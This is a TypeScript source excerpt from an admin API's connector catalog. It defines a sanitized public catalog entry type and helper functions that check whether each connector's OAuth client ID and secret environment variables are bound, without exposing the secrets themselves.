/** `GET /v1/admin/connectors/catalog` shape: fields for the drawer, never the probe internals (vendor
 *  URLs, body templates) an unauthenticated-until-Access-checked route response has no business leaking,
 *  and never `oauth.clientIdEnv`/`clientSecretEnv` names beyond what `oauthConfigured` already implies -
 *  the page needs to know *whether* the Operator's app registration exists, not name the exact secret. */
export interface PublicConnectorCatalogEntry {
  kind: ConnectorKind
  label: string
  category: ConnectorCatalogCore['category']
  transport: ConnectorCatalogCore['transport']
  auth: ConnectorCatalogCore['auth']
  /** `needs-oauth` kinds flip to `ready` once `oauthConfigured` is true (task item 5) - never the other
   *  way around: a bound secret never turns a genuinely `ready` (static-credential) kind into anything
   *  else, and an unbound one is never reported as `ready`. */
  availability: ConnectorCatalogCore['availability']
  docsUrl: string
  logo: ConnectorKind
  fields: ConnectorField[]
  headerName?: string
  endpoint?: string
  hasProbe: boolean
  /** True only when both `OAUTH_<KIND>_CLIENT_ID` and `OAUTH_<KIND>_CLIENT_SECRET` are bound and
   *  non-blank; always `false` for a kind with no `oauth` config at all. Never derived from anything an
   *  admin typed into a specific connection's drawer - this is the catalog-wide Operator app
   *  registration, not a per-row credential. */
  oauthConfigured: boolean
}

/** Reads an env value by name without widening the shared `AdminCtx`/`Env` type (owned by
 *  `routes/admin-ctx.ts`, not this module) with one named field per vendor - the set of
 *  `OAUTH_<KIND>_CLIENT_ID`/`_SECRET` names is defined entirely by this catalog's `oauth.clientIdEnv` /
 *  `clientSecretEnv` values, so a lookup keyed by that string is the only sane alternative to a dozen
 *  near-duplicate optional fields on `Env`. */
export function oauthEnvValue(env: unknown, name: string): string | undefined {
  if (!env || typeof env !== 'object') return undefined
  const value = (env as Record<string, unknown>)[name]
  return typeof value === 'string' ? value : undefined
}

export function isOAuthConfigured(entry: ConnectorCatalogEntry, env: unknown): boolean {
  if (!entry.oauth) return false
  const clientId = (oauthEnvValue(env, entry.oauth.clientIdEnv) || '').trim()
  const clientSecret = (oauthEnvValue(env, entry.oauth.clientSecretEnv) || '').trim()
  return Boolean(clientId && clientSecret)
}

/** The one check every admin route that gates on "is this kind usable yet" should share:
 *  `entry.availability` for the five kinds that were always usable, or `isOAuthConfigured` for the six
 *  that need the Operator's own app registration bound first. `routes/integrations.ts`'s
 *  `POST /v1/admin/integrations` (the manual credential path, including the client-credentials kinds'
 *  tenant/client-id/secret drawer per plan 6.10b) and its draft-test route both use this instead of the
 *  static `availability` field alone, so a bound secret genuinely unlocks the same drawer the catalog
 *  response already advertises as `ready` - a static-only check would leave the UI and the route
 *  permanently disagreeing once Tony binds the secrets. */
export function isConnectorReady(entry: ConnectorCatalogEntry, env: unknown): boolean {
  return entry.availability !== 'needs-oauth' || isOAuthConfigured(entry, env)
}

/** Every `OAUTH_<KIND>_CLIENT_ID` / `OAUTH_<KIND>_CLIENT_SECRET` name still unbound for `kind`, in that
 *  order - the exact shape `GET .../oauth/start`'s 503 names in `missing`. Empty when the kind has no
 *  `oauth` config, or both secrets are already bound. */
export function missingOAuthEnvNames(entry: ConnectorCatalogEntry, env: unknown): string[] {
  if (!entry.oauth) return []
  const missing: string[] = []
  if (!(oauthEnvValue(env, entry.oauth.clientIdEnv) || '').trim()) missing.push(entry.oauth.clientIdEnv)
  if (!(oauthEnvValue(env, entry.oauth.clientSecretEnv) || '').trim()) missing.push(entry.oauth.clientSecretEnv)
  return missing
}

/** `env` is optional (and, when omitted, every kind reports `oauthConfigured: false`) so existing callers
 *  that pre-date task 6.10b's OAuth work keep compiling unchanged; `routes/integrations.ts`'s catalog
 *  route is the one call site that must pass `ctx.env` to get real, request-time-accurate values. */
export function publicConnectorCatalog(env?: unknown): PublicConnectorCatalogEntry[] {
  return CONNECTOR_KINDS.map((kind) => {
    const e = CONNECTOR_CATALOG[kind]
    const oauthConfigured = isOAuthConfigured(e, env)
    return {
      kind: e.kind,
      label: e.label,
      category: e.category,
      transport: e.transport,
      auth: e.auth,
      availability: e.availability === 'needs-oauth' && oauthConfigured ? 'ready' : e.availability,
      docsUrl: e.docsUrl,
      logo: e.logo,
      fields: e.fields,
      headerName: e.headerName,
      endpoint: e.transport === 'mcp' ? e.endpoint : undefined,
      hasProbe: e.probe !== null,
      oauthConfigured
    }
  })
}
